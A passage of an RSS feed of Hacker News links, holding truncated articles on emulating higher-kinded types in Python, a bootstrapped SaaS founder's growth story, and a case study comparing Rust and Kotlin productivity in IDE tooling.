<span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>((</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>)))</span>
<span>#  Revealed type is 'typing.Iterable[builtins.str]'
</span></code></pre></div></div>

<p>You can see that a part of our typing information is lost. We pass <code>List</code> or <code>Set</code> or <code>Tuple</code> and always get the <code>Iterable</code> back.</p>

<p>Sometimes - this is ok. But, in some cases, this is not enough. Let‚Äôs try some other technique!</p>


    
      <h3 id="methods">
        
        <a href="#methods">Methods</a>
        
      </h3>

<p>One can say: we are all using Object-Oriented Programming! Why cannot we just create a new method for each type we need? And specify the exact return type there!</p>

<p>Well, it is a possible solution. But, there are some reasonable problems:</p>

<ul>
  <li>You cannot add methods to existing types and extend them with this approach. Only create new ones, probably via subtyping, and add new methods there. In our example you would have to create your own versions of <code>List</code>, <code>Set</code>, and <code>Tuple</code>. Which is not desirable in most situations</li>
  <li>It really starts to be messy if you have a lot of methods to add. A type with more than <code>X</code> (choose the number yourself) methods starts to be really complex to read, understand, and use. Instead, using separate functions is much easier, because we don‚Äôt have to put everything into a single namespace</li>
</ul>

<p>Let‚Äôs try something else.</p>


    
      <h3 id="overloads">
        
        <a href="#overloads">overloads</a>
        
      </h3>

<p>Another solution that might solve our problem is using the <code>@overload</code> decorator with proper types for each required case.</p>

<div><div><pre><code><span>from</span> <span>typing</span> <span>import</span> <span>List</span><span>,</span> <span>Set</span><span>,</span> <span>overload</span>

<span>@</span><span>overload</span>
<span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>:</span> <span>List</span><span>[</span><span>int</span><span>])</span> <span>-&gt;</span> <span>List</span><span>[</span><span>str</span><span>]:</span>
    <span>...</span>

<span>@</span><span>overload</span>
<span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>:</span> <span>Set</span><span>[</span><span>int</span><span>])</span> <span>-&gt;</span> <span>Set</span><span>[</span><span>str</span><span>]:</span>
    <span>...</span>

<span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>):</span>
    <span>return</span> <span>type</span><span>(</span><span>arg</span><span>)(</span><span>str</span><span>(</span><span>item</span><span>)</span> <span>for</span> <span>item</span> <span>in</span> <span>arg</span><span>)</span>
</code></pre></div></div>

<p>Let‚Äôs test it:</p>

<div><div><pre><code><span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>([</span><span>1</span><span>,</span> <span>2</span><span>]))</span>
<span># Revealed type is 'builtins.list[builtins.str]'
</span>
<span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>({</span><span>1</span><span>,</span> <span>2</span><span>}))</span>
<span># Revealed type is 'builtins.set[builtins.str]'
</span></code></pre></div></div>

<p>Awesome! Looks like we‚Äôve achieved our goal, haven‚Äôt we? But, there‚Äôs a new problem. We have to manually list all possible cases in a function‚Äôs signature. This works for cases when all possible arguments and outcomes are known in advance. But, not in this case. In Python <code>Iterable</code> is a protocol. We can use this function with any type with <code>__iter__</code> method defined: with both builtin and custom types. So, the number of possible arguments and outcomes is endless.</p>

<p>To illusrate the problem, let‚Äôs see what happens for <code>Tuple</code> which is not listed in the function‚Äôs overloads:</p>

<div><div><pre><code><span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>((</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>)))</span>
<span># error: No overload variant of "stringify_iterable_items" matches argument type "Tuple[int, int, int]"
</span></code></pre></div></div>

<p>We, in <code>dry-python</code> <a href="https://github.com/dry-python/returns/blob/0.14.0/returns/_generated/converters/flatten.pyi">used this technique</a> with <code>@overload</code> decorator for our previous versions. This allowed us to write correct definitions of functions working with generic types. But, they were limited to the pre-defined set of our own types. And we wanted to allow our users to create their custom types based on our interfaces. With the full existing code reuse.</p>


    
      <h2 id="higher-kinded-types">
        
        <a href="#higher-kinded-types">Higher Kinded Types</a>
        
      </h2>

<p>That‚Äôs where the idea of Higher Kinded Types becomes useful. We need HKTs when we want to change the inner structure of generics with full type information preserving and openness to the extension. In theory, you can write something like:</p>

<div><div><pre><code><span>from</span> <span>typing</span> <span>import</span> <span>Iterable</span>

<span>T</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'T'</span><span>,</span> <span>bound</span><span>=</span><span>Iterable</span><span>)</span>

<span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>:</span> <span>T</span><span>[</span><span>int</span><span>])</span> <span>-&gt;</span> <span>T</span><span>[</span><span>str</span><span>]:</span>
    <span>return</span> <span>type</span><span>(</span><span>arg</span><span>)(</span><span>str</span><span>(</span><span>item</span><span>)</span> <span>for</span> <span>item</span> <span>in</span> <span>arg</span><span>)</span>
</code></pre></div></div>

<p>And this would solve our problem! What happens here is that we abstract away the <code>Iterable</code> type itself. And then ask <code>mypy</code> to figure this out for us.</p>

<p>This way we can potentially have <code>stringify_iterable_items</code> working for any <code>Iterable</code> type, but with the exact same type returned back without any information lost. And it would work for all types.</p>

<div><div><pre><code><span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>([</span><span>1</span><span>,</span> <span>2</span><span>]))</span>
<span># Revealed type is 'builtins.list[builtins.str]'
</span>
<span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>({</span><span>1</span><span>,</span> <span>2</span><span>}))</span>
<span># Revealed type is 'builtins.set[builtins.str]'
</span>
<span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>(</span><span>MyCustomIterable</span><span>(</span><span>1</span><span>,</span> <span>2</span><span>)))</span>
<span># Revealed type is 'my_module.MyCustomIterable[builtins.str]'
</span></code></pre></div></div>

<p>Unfortunately, <a href="https://github.com/python/typing/issues/548">it is not supported</a> at the moment.</p>


    
      <h3 id="emulation">
        
        <a href="#emulation">Emulation</a>
        
      </h3>

<p>Turns out we are not alone in this situation. There are multiple languages where Higher Kinded Types are not natively supported yet. But, they can be emulated:</p>

<ul>
  <li><a href="https://github.com/gcanti/fp-ts/blob/master/docs/guides/HKT.md">TypeScript</a></li>
  <li><a href="https://bow-swift.io/docs/fp-concepts/higher-kinded-types/">Swift</a></li>
  <li><a href="https://arrow-kt.io/docs/0.10/patterns/glossary/#higher-kinds">Kotlin</a></li>
</ul>

<p>And now with <a href="https://returns.readthedocs.io/en/latest/pages/hkt.html">Python</a> too!</p>

<p>There‚Äôs also <a href="https://www.cl.cam.ac.uk/~jdy22/papers/lightweight-higher-kinded-polymorphism.pdf">an original whitepaper</a> for ones who are interested.</p>

<p>The core idea of HKT emulation is that we can write types the other way around: not like <code>T[int]</code>, but rather like <code>Kind[T, int]</code> (which is absolutely the same thing).</p>

<p>This way we can transform the inner structure of generics, but maintain the simple context without reinventing <code>TypeVar</code> with type arguments. And our function‚Äôs type signature will look like: <code>Kind[T, int] -&gt; Kind[T, str]</code>.</p>

<p>Let‚Äôs see the implementation.</p>


    
      <h2 id="implementation">
        
        <a href="#implementation">Implementation</a>
        
      </h2>

<p><strong>TLDR</strong>: here‚Äôs <a href="https://gist.github.com/sobolevn/7f8ffd885aec70e55dd47928a1fb3e61">the final working code</a> with all the logic, all the hacks, and everything. In this article, we going to write and explain it step by step.</p>

<p>We would need a better example to test our implementation. Let‚Äôs build two types: a <code>Box</code> and a <code>Bag</code>. <code>Box</code> is defined by its size, while a <code>Bag</code> is an item of fashion: it has a brand name and a model name (I have a wife, I know this stuff!).</p>

<div><div><pre><code><span>from</span> <span>dataclasses</span> <span>import</span> <span>dataclass</span>
<span>from</span> <span>typing</span> <span>import</span> <span>Callable</span><span>,</span> <span>Generic</span><span>,</span> <span>TypeVar</span>

<span>_ValueType</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_ValueType'</span><span>)</span>
<span>_NewValueType</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_NewValueType'</span><span>)</span>

<span>@</span><span>dataclass</span>
<span>class</span> <span>Box</span><span>(</span><span>Generic</span><span>[</span><span>_ValueType</span><span>]):</span>
    <span>value</span><span>:</span> <span>_ValueType</span>
    <span>length</span><span>:</span> <span>int</span>
    <span>width</span><span>:</span> <span>int</span>
    <span>height</span><span>:</span> <span>int</span>

<span>@</span><span>dataclass</span>
<span>class</span> <span>Bag</span><span>(</span><span>Generic</span><span>[</span><span>_ValueType</span><span>]):</span>
    <span>value</span><span>:</span> <span>_ValueType</span>
    <span>brand</span><span>:</span> <span>str</span>
    <span>model</span><span>:</span> <span>str</span>
</code></pre></div></div>

<p>And we can create <code>Box</code>es and <code>Bag</code>s of different types, because we can put different things inside them:</p>

<div><div><pre><code><span>box</span> <span>=</span> <span>Box</span><span>(</span><span>value</span><span>=</span><span>10</span><span>,</span> <span>length</span><span>=</span><span>1</span><span>,</span> <span>width</span><span>=</span><span>2</span><span>,</span> <span>height</span><span>=</span><span>3</span><span>)</span>  <span># Box[int]
</span><span>bag</span> <span>=</span> <span>Bag</span><span>(</span><span>value</span><span>=</span><span>5</span><span>,</span> <span>brand</span><span>=</span><span>'Fancy'</span><span>,</span> <span>model</span><span>=</span><span>'Baggy'</span><span>)</span>  <span># Bag[int]
</span></code></pre></div></div>

<p>Now, we need a function with a type transformation. Let‚Äôs say we want to apply a function to the value inside boxes and bags. Let‚Äôs use fake <code>BoxOrBag</code> type for now to illustrate our intent:</p>

<div><div><pre><code><span>from</span> <span>typing</span> <span>import</span> <span>Callable</span>

<span>_NewValueType</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_NewValueType'</span><span>)</span>

<span>def</span> <span>apply_function</span><span>(</span>
    <span>instance</span><span>:</span> <span>BoxOrBag</span><span>[</span><span>_ValueType</span><span>],</span>  <span># fake type for now
</span>    <span>callback</span><span>:</span> <span>Callable</span><span>[[</span><span>_ValueType</span><span>],</span> <span>_NewValueType</span><span>],</span>
<span>)</span> <span>-&gt;</span> <span>BoxOrBag</span><span>[</span><span>_NewValueType</span><span>]:</span>  <span># fake type for now
</span>    <span>...</span>
</code></pre></div></div>

<p>It is going to work like so:</p>

<div><div><pre><code><span>assert</span> <span>apply_function</span><span>(</span><span>box</span><span>,</span> <span>str</span><span>)</span> <span>==</span> <span>Box</span><span>(</span><span>value</span><span>=</span><span>'10'</span><span>,</span> <span>length</span><span>=</span><span>1</span><span>,</span> <span>width</span><span>=</span><span>2</span><span>,</span> <span>height</span><span>=</span><span>3</span><span>)</span>
<span>assert</span> <span>apply_function</span><span>(</span><span>bag</span><span>,</span> <span>bool</span><span>)</span> <span>==</span> <span>Bag</span><span>(</span><span>value</span><span>=</span><span>True</span><span>,</span> <span>brand</span><span>=</span><span>'Fancy'</span><span>,</span> <span>model</span><span>=</span><span>'Baggy'</span><span>)</span>
</code></pre></div></div>

<p>We only need to change current fake <code>BoxOrBag</code> type to a real HKT. We would need to define a new <code>Kind</code> type to make the emulation:</p>

<div><div><pre><code><span>_InstanceType</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_InstanceType'</span><span>,</span> <span>covariant</span><span>=</span><span>True</span><span>)</span>
<span>_FirstTypeArgType</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_FirstTypeArgType'</span><span>,</span> <span>covariant</span><span>=</span><span>True</span><span>)</span>

<span>class</span> <span>Kind</span><span>(</span><span>Generic</span><span>[</span><span>_InstanceType</span><span>,</span> <span>_FirstTypeArgType</span><span>]):</span>
    <span>"""Used for HKT emulation."""</span>
</code></pre></div></div>

<p>One pro-tip about <code>Kind</code>: it won‚Äôt not exist during runtime. Only during type-checking.</p>

<p>Now, let‚Äôs change <code>apply_function</code> to use <code>Kind</code>:</p>

<div><div><pre><code><span>_InstanceKind</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_InstanceKind'</span><span>)</span>

<span>def</span> <span>apply_function</span><span>(</span>
    <span>instance</span><span>:</span> <span>Kind</span><span>[</span><span>_InstanceKind</span><span>,</span> <span>_ValueType</span><span>],</span>
    <span>callback</span><span>:</span> <span>Callable</span>‚Ä¶</code></pre></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sobolevn.me/2020/10/higher-kinded-types-in-python">https://sobolevn.me/2020/10/higher-kinded-types-in-python</a></em></p>]]>
            </description>
            <link>https://sobolevn.me/2020/10/higher-kinded-types-in-python</link>
            <guid isPermaLink="false">hacker-news-small-sites-24939974</guid>
            <pubDate>Fri, 30 Oct 2020 07:40:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[2 People, No VC Money, $700k+ ARR in Less Than 3 Years]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24939911">thread link</a>) | @yosid
<br/>
October 30, 2020 | https://provesrc.com/blog/celebrating-3-years/ | <a href="https://web.archive.org/web/*/https://provesrc.com/blog/celebrating-3-years/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<p><strong>TLDR:</strong> Stories and takeaways from growing ProveSource from 0 to $700k ARR as a 2-person team in less than 3 years and with no funding.</p>
<p><img loading="lazy" src="https://provesrc.com/blog/wp-content/uploads/2020/10/3-year-story-cover.png" alt="3 year story provesource" width="1920" height="1080" srcset="https://provesrc.com/blog/wp-content/uploads/2020/10/3-year-story-cover.png 1920w, https://provesrc.com/blog/wp-content/uploads/2020/10/3-year-story-cover-300x169.png 300w, https://provesrc.com/blog/wp-content/uploads/2020/10/3-year-story-cover-1024x576.png 1024w, https://provesrc.com/blog/wp-content/uploads/2020/10/3-year-story-cover-768x432.png 768w, https://provesrc.com/blog/wp-content/uploads/2020/10/3-year-story-cover-1536x864.png 1536w" sizes="(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px"></p>
<h2><strong>Our false start</strong></h2>
<p>We started the company in June 2015 with no real idea.</p>
<p>Most people we know fail to ever get started because they‚Äôre looking for the perfect idea.</p>
<p>As the founder of Instagram famously said:</p>
<p>‚ÄúIt‚Äôs about going through false starts. The best companies in the world have all had predecessors. YouTube was a dating site. You always have to evolve into something else.‚Äù</p>
<p>We brainstormed for several days and because both myself and Natan (my co-founder) are very good with mobile app development (iOS &amp; Android) we decided to build a personalization platform for mobile apps and sell it to enterprises.</p>
<p>Around 2.5 years later, having invested almost $100k out of our own pockets, having done hundreds of calls and demos with huge enterprises and dozens of Proof of Concepts, we decided it‚Äôs time to move on‚Ä¶</p>
<p>It felt awful ‚Äì like you‚Äôre killing something you love, but it had to be done.</p>
<p>That was our ‚Äúfalse start‚Äù. But more on that another time.</p>
<p><strong>üß† Lesson learned:</strong></p>
<p>The sooner you kill an idea that is getting no traction, even if it‚Äôs super hard because it‚Äôs your baby, the less painful it is. The more time and resources you devote, the harder it becomes to pull out in case things don‚Äôt work out.</p>
<h2><strong>Starting over ‚Äì The lean way</strong></h2>
<p>In January 2018 we decided to start working on a new SaaS product.</p>
<p>The idea was to ‚Äústeal‚Äù the social proof hack that Booking.com was using (e.g. 5 people booked this hotel, etc.) and create a platform from it ‚Äì a social proof marketing platform.</p>
<p>This time, because we were running on fumes, both in terms of cash and motivation, we decided to validate the idea first.</p>
<p>We had a single purpose in mind ‚Äì getting 100 leads interested in our product.</p>
<p>We created a landing page that showcased our new idea as a real product, including pricing, a signup button, and all ‚Äì a social proof marketing platform for mobile apps.</p>
<p><img loading="lazy" src="https://provesrc.com/blog/wp-content/uploads/2020/10/landing-page-for-product-validation-ps.png" alt="" width="1920" height="1080" srcset="https://provesrc.com/blog/wp-content/uploads/2020/10/landing-page-for-product-validation-ps.png 1920w, https://provesrc.com/blog/wp-content/uploads/2020/10/landing-page-for-product-validation-ps-300x169.png 300w, https://provesrc.com/blog/wp-content/uploads/2020/10/landing-page-for-product-validation-ps-1024x576.png 1024w, https://provesrc.com/blog/wp-content/uploads/2020/10/landing-page-for-product-validation-ps-768x432.png 768w, https://provesrc.com/blog/wp-content/uploads/2020/10/landing-page-for-product-validation-ps-1536x864.png 1536w" sizes="(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px"></p>
<p>The fastest way to get targeted traffic to your website is to use Google Ads targeting the brand names of the biggest players in your niche.</p>
<p>So we did that.</p>
<p>We also posted the landing page anywhere we could think of: Reddit, ProductHunt, BetaList, social media, wherever‚Ä¶</p>
<p>About one month and ‚Äì $300 later, we had around 200 leads that wanted to try out ProveSource.</p>
<p>We were finally making progress!</p>
<p>We figured that even if only 1% of them converted, we would already have 2 paying customers.</p>
<p><strong>üß† Lesson learned:</strong></p>
<p>You can easily get traction without having a product.</p>
<p>Just buy a domain, build a landing page, and go validate your business idea.</p>
<p>We usually create landing pages to validate products using plain HTML and Airtable, to send the leads we collect from the forms. No fancy designs, no expensive CRM.</p>
<h2><strong>Making our first dollar $</strong></h2>
<p>Next goal ‚Äì how do we make a dollar?</p>
<p>That is, unlike our previous product which made practically $0 in 2.5 years.</p>
<p>We created a rule that whenever we launch a new product, all our efforts will be towards making our first dollar, so we can have real-life validation.</p>
<p>So we have 200 people interested in ProveSource.</p>
<p>Now we needed to give them a product and get them to pay.</p>
<p>We built the leanest MVP possible:</p>
<ul>
<li>A product just for website owners (mobile was too small of a niche).</li>
<li>You could only show how many page visitors you had on your website.</li>
<li>The whole UI and UX should be super simple. No menus and extra buttons, don‚Äôt give users a reason to abandon your product.</li>
</ul>
<p>Did you forget your password and need to reset it? Sorry, no can do.</p>
<p>Did we accidentally change your password when you logged in? Oops, we‚Äôre on it.</p>
<p>What are onboarding and email automation? Dunno, don‚Äôt care.</p>
<p>April 2018 ‚Äì we are approached by a Facebook Group admin that is interested in promoting our product to his group as a ‚Äúlifetime deal‚Äù (LTD).</p>
<p>This means selling a lifetime subscription to your product for a one-off payment ranging from $39-$99.</p>
<p>We‚Äôve never heard of this before so we thought long and hard about the consequences of selling a lifetime deal and how it would position the product and our company‚Ä¶</p>
<p>We decided to go with the deal and ran it with the group for 1 week.</p>
<p>We generated over $7k revenue, got tons of feedback, ideas for product improvements, tons of bugs were discovered in the process, which taught us the value of having live chat support.</p>
<p><strong>üß† Lesson learned:</strong></p>
<p>In hindsight, there were no real consequences, only advantages to running a lifetime deal.</p>
<p>Sure, you have a few dozens of customers that are not paying you on a recurring basis ‚Äì but they help a lot in the beginning when you need the cash and the validation.</p>
<p>Once we were done with the LTD we started pushing the product in all marketing channels and to our 200 user waiting list. None of them converted by the way.</p>
<p>A couple of days later we got our first monthly subscription customer ($19/month).</p>
<p>It was an amazing moment, validating that you indeed have a real business opportunity in your hands.</p>
<h2><strong>Our ‚Äúwow moment‚Äù</strong></h2>
<p>During the next months, we focused on spreading the word, squashing bugs, and doing tons of support for our existing customers.</p>
<p>How did we decide what to build next?</p>
<ul>
<li>We learned to ask questions about our product‚Äôs value. Why do people buy our product? Is it because they want to increase conversions? How do we help them achieve that?</li>
<li>We brainstormed about what it means to be a social proof platform.</li>
<li>We heard our customers‚Äô feedback</li>
<li>We learned from competitors; but not too much. We found that those who only copy will always lag behind.</li>
</ul>
<p>This whole process has to be accompanied by analytics and metrics.</p>
<p>You don‚Äôt have to measure each and every step or A/B test you do, though.</p>
<p>We don‚Äôt really do it, to this day.</p>
<p>A lot of product leaders talk about the ‚Äúwow effect‚Äù or ‚Äúwow moment‚Äù ‚Äì if you want to retain users, make them say ‚Äúwow‚Äù.</p>
<p>For Facebook, for example, their ‚Äúwow moment‚Äù is logging into their platform and seeing familiar faces. That‚Äôs why they make sure that during sign up, you connect with as many people you know on Facebook as possible.</p>
<p>In our case, we focused on improving our user onboarding.</p>
<p>Since the product requires users to install a javascript snippet on their website, we put a big emphasis on making that process as easy as possible.</p>
<p>Our thought was ‚Äì if users can see a social proof notification on their website, they‚Äôll get to that ‚Äúwow moment‚Äù.</p>
<p>We can see a very close correlation between successful onboarding and someone becoming a paying customer.</p>
<p>The funnel looks like this:</p>
<ul>
<li>8-10% of visitors will signup.</li>
<li>70% of those signups will complete the onboarding.</li>
<li>7-10% of those users who are onboarded will eventually become paying customers.</li>
</ul>
<p><img loading="lazy" src="https://provesrc.com/blog/wp-content/uploads/2020/10/ProveSource-Signups-Funnel.png" alt="ProveSource Signups Funnel" width="1920" height="1080" srcset="https://provesrc.com/blog/wp-content/uploads/2020/10/ProveSource-Signups-Funnel.png 1920w, https://provesrc.com/blog/wp-content/uploads/2020/10/ProveSource-Signups-Funnel-300x169.png 300w, https://provesrc.com/blog/wp-content/uploads/2020/10/ProveSource-Signups-Funnel-1024x576.png 1024w, https://provesrc.com/blog/wp-content/uploads/2020/10/ProveSource-Signups-Funnel-768x432.png 768w, https://provesrc.com/blog/wp-content/uploads/2020/10/ProveSource-Signups-Funnel-1536x864.png 1536w" sizes="(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px"></p>
<p><strong>üß† Lesson learned:</strong></p>
<p>Find what your ‚Äúwow moment‚Äù is in your users‚Äô experience, and make sure you get users to experience it as early in the onboarding process as possible. That way you can spend a lot on User Acquisition activities because the users you bring in end up becoming paying customers and sticking with you.</p>
<h2><strong>Our First Growth ‚ÄúHack‚Äù</strong></h2>
<p>After we added some ‚Äúnecessary‚Äù features like showing recent sales and polishing the product to have fewer bugs ‚Äì we wanted to grow bigger, we wanted to scale up, we wanted to get more exposure.</p>
<p>How do you scale a notifications product that is essentially an add-on for websites?</p>
<p>You build integrations for all website builders.</p>
<p>So we worked hard on adding more and more integrations: <a href="https://wordpress.org/plugins/provesource/">WordPress plugin</a>, <a href="https://apps.shopify.com/provesource">Shopify app</a>, Magento plugin, Wix app, <a href="https://zapier.com/apps/provesource/integrations">Zapier</a>, <a href="https://www.bigcommerce.com/apps/provesource-social-proof/">BigCommerce</a>, and more.</p>
<p>All of these marketplaces and app stores proved to be really good traffic sources and traction channels for us, each with its own audience and unique requirements.</p>
<p>Today, around 20% of our customers and revenue comes from Shopify alone.</p>
<h2><strong>Scaling past 2 people</strong></h2>
<p>Being a two-person team that does development, marketing, support, accounting, and more is tough. But it also teaches you a lot, you learn so much about your business, your audience, and your customers.</p>
<p>And that gives you the experience you need on what to look for when hiring someone to take over some of your responsibilities.</p>
<p>In September 2019 we decided it‚Äôs time to scale the team.</p>
<p>After all, a great company can‚Äôt be just 2 people, right?</p>
<p>Naturally, a software company‚Äôs first hire would be a developer.</p>
<p>Bringing Dima to the team, allowed us to build more integrations faster, and scale the company beyond its initial stage.</p>
<p>So we now have tons of integrations, pretty much with any large marketing or website platform out there.</p>
<p>We also scaled and optimized our Google and Facebook ads as much as we could.</p>
<p>We optimized our product onboarding rate, increased prices, added great features, and made it even easier to use the product, by adding tooltips, auto-suggestions, wizards, and more.</p>
<p>We were growing at a steady rate, so what could possibly be bothering us?</p>
<p>Well, we didn‚Äôt know how to grow faster, or what to do next.</p>
<p>We came up with a few ideas:</p>
<ul>
<li>Bring a Growth team member to scale our marketing efforts and bring new ideas to the table.</li>
<li>Since our product offering is strong and we couldn‚Äôt think about any impactful feature we could develop ‚Äì we thought about zooming out of our product‚Äôs initial market.</li>
<li>Build a new product ‚Äì we have no investors so we are free to make any decision we want about the company‚Äôs direction. Investors often block the founders from doing whatever is best for the company and push for a point where they can exit.</li>
</ul>
<h2><strong>Building a new product</strong></h2>
<p>At this point, we decided to build another product to scale the company further.</p>
<p>We had these questions in mind before picking what to work on:</p>
<ul>
<li>How big is the market, is it potentially bigger than our current product?</li>
<li>Would our existing customers be customers of this new product too?</li>
<li>What do our existing customers need and are willing to pay for?</li>
</ul>
<p>Adding ProveSource to your website is great, but, there is a critical prerequisite to making it work for you and your website: traffic. If your website has no traffic, you won‚Äôt be able to generate social proof.</p>
<p>Here‚Äôs the ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://provesrc.com/blog/celebrating-3-years/">https://provesrc.com/blog/celebrating-3-years/</a></em></p>]]>
            </description>
            <link>https://provesrc.com/blog/celebrating-3-years/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24939911</guid>
            <pubDate>Fri, 30 Oct 2020 07:21:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[For Complex Applications, Rust Is as Productive as Kotlin]]>
            </title>
            <description>
<![CDATA[
Score 58 | Comments 11 (<a href="https://news.ycombinator.com/item?id=24939875">thread link</a>) | @quyleanh
<br/>
October 30, 2020 | https://ferrous-systems.com/blog/rust-as-productive-as-kotlin/ | <a href="https://web.archive.org/web/*/https://ferrous-systems.com/blog/rust-as-productive-as-kotlin/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id="preamble">
<div>
<p>In this article, we will compare one apple (IntelliJ Rust) to one orange (rust-analyzer) to reach general and sweeping conclusions.
Specifically, I want to present a case study supporting the following claim:</p>
<p>For complex applications, Rust is as productive as Kotlin.</p>
<p>For me, this is an unusual claim to argue: I always thought exactly the opposite, but I am not so sure now.
I came to Rust from C++.
I was of the opinion that this is a brilliant low-level language and always felt puzzled at people writing higher-level things in Rust.
Clearly, choosing Rust means taking a productivity hit, and using Kotlin, C# or Go just makes much more sense if you can afford GC.
My <a href="https://matklad.github.io/2020/09/20/why-not-rust.html">list of Rust criticisms</a> starts with this objection.</p>
<p>What moved my position in the other direction was my experience as the lead developer of rust-analyzer and IntelliJ Rust.
Let me introduce the two projects.</p>
<p><a href="https://github.com/intellij-rust/intellij-rust"><strong>IntelliJ Rust</strong></a> is the plugin for IntelliJ Platform, providing Rust support.
In effect, it is a Rust compiler front-end, written in Kotlin and making use of language-support features of the platform.
These features include lossless syntax trees, a parser generator, persistence and indexing infrastructure, among others.
Nonetheless, as programming languages differ lot, the bulk of logic for analyzing Rust is implemented in the plugin itself.
Presentational features like completion list come from the platform, but most of the language semantics is hand-written.
IntelliJ Rust also includes a bit of a Swing GUI.</p>
<p><a href="https://github.com/rust-analyzer/rust-analyzer"><strong>rust-analyzer</strong></a> is an implementation of
<a href="https://microsoft.github.io/language-server-protocol/">Language Server Protocol</a> for Rust.
It is a Rust compiler front-end written from scratch with an eye towards IDE support.
It makes heavy use of <a href="https://github.com/salsa-rs/salsa">salsa</a> library for incremental computations.
Beyond the compiler itself, rust-analyzer includes code for managing long-lived multithreaded process of the language server itself.</p>
<p>The projects are essentially equivalent in scope‚Äâ‚Äî‚Äârust compiler front-ends suitable for IDEs.
The two biggest differences are:</p>
<div>
<ul>
<li>
<p>IntelliJ Rust is a plugin, so it can re-use code and design patterns of the surrounding platform.</p>
</li>
<li>
<p>rust-analyzer is the second system, so it leverages experience of IntelliJ Rust for a from-scratch design.</p>
</li>
</ul>
</div>
<p>The internal architecture of the two projects also differs a lot.
In terms of <a href="https://rust-analyzer.github.io/blog/2020/07/20/three-architectures-for-responsive-ide.html">Three Architectures</a>, IntelliJ Rust is map-reduce, and rust-analyzer is query-based.</p>
<p>Writing an IDE-ready compiler is a high-level task.
You don‚Äôt need to talk to the operating system directly.
There are some fancy data structures and concurrency here and there, but they are also high-level.
It‚Äôs not about implementing crazy lock-free schemes, it‚Äôs about maintaining application state and sanity in the multithreaded world.
The bulk of the compiler is symbolic manipulation, arguably best suited for lisp.
Picking a VM-based language for such task (for example, OCaml), doesn‚Äôt have any intrinsic downsides.</p>
<p>At the same time, the task is pretty complex and unique.
The ratio of ‚Äúyour code‚Äù vs ‚Äúframework code‚Äù when implementing features is much higher than in a typical CRUD backend.</p>
<p>Now that the projects are introduced, lets take two roughly equivalent slices of history.</p>

<p>Both are about 2 years old, with 1-1.5 developers working full time and vibrant and thriving community of open-source contributors.
There are 52k lines of Kotlin and 66k lines of Rust.</p>
<p>Both delivered roughly equivalent feature sets at that time.
To be honest, I still don‚Äôt really believe this :)
rust-analyzer started from zero, it didn‚Äôt have a decade worth of Java classes to bootstrap from, and the productivity drop between Kotlin and Rust is supposed to be huge.
But it‚Äôs hard to argue with reality.
Instead, let me try to reflect on my experience building both, and to try to explain Rust‚Äôs surprising productivity.</p>
</div>
</div>
<div>
<h2 id="_learning_curve">Learning Curve</h2>
<div>
<p>It‚Äôs easy to characterize Kotlin‚Äôs learning curve‚Äâ‚Äî‚Äâit is nearly zero.
I‚Äôve started IntelliJ Rust without Kotlin experience and never felt that I need to specifically learn Kotlin.</p>
<p>When I switched to rust-analyzer, I was pretty experienced with Rust.
I would say that one definitely needs to deliberately learn Rust, it‚Äôs hard to pick it up on the go.
Ownership and aliasing control are novel concepts (even if you come from C++), and taking holistic approach to learning them pays off.
After the initial learning step the ride is generally smooth.</p>
<p>By the way, this is the perfect place to plug our Rust courses and tailor-made <a href="https://ferrous-systems.com/training/">trainings</a> :-)
The next <a href="https://ferrous-systems.com/training/#package-intro-training">introduction to Rust</a> is happening this December!</p>
</div>
</div>
<div>
<h2 id="_modularity">Modularity</h2>
<div>
<p>This I think is the biggest factor.
Both projects are moderately large in terms of scope as well as in terms of amount of source code.
I believe that the only way to ship big things is to split them in independent-ish chunks and implement the chunks separately.</p>
<p>I also find most of the languages I am familiar with to be pretty horrible with respect to modularity.
More generally, I am amused with FP vs OO debate, as it seems that ‚Äúwhy no one does modules right?‚Äù is a more salient issue.</p>
<p>Rust is one of the few languages which has first-class concept of libraries.
Rust code is organized on two levels:</p>
<div>
<ul>
<li>
<p>as a tree of inter-dependent modules inside a crate</p>
</li>
<li>
<p>and as a directed acyclic graph of crates</p>
</li>
</ul>
</div>
<p>Cyclic dependencies are allowed between the modules, but not between the crates.
Crates are units of reuse and privacy: only crate‚Äôs public API matters, and it is crystal clear what crate‚Äôs public API is.
Moreover, crates are anonymous, so you don‚Äôt get name conflicts and dependency hell when mixing several versions of the same crate in a single crate graph.</p>
<p>This makes it very easy to make two pieces of code <strong>not</strong> depend on each other (non-dependencies are the essence of modularity): just put them in separate crates.
During code review, only changes to Cargo.tomls need to be monitored carefully.</p>
